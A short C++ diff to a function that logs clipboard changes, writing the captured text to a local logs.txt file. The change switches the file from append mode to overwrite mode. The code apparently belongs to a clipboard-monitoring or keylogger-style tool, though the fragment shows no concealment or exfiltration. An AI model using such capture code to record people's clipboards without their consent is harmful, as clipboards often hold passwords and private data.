@@ -131,7 +131,7 @@ void writeClipboardChange(){
 	const std::locale utf8_locale = std::locale("en_US.UTF-8");
 	std::wofstream logfile;
 
-	logfile.open("logs.txt", std::ios::app);
+	logfile.open("logs.txt", std::ios::out);
 	logfile.imbue(utf8_locale);
 	logfile << std::endl << L"***ClipBoard Change*** : *";
 	logfile << getClipboardText() << "*" << std::endl << std::endl;
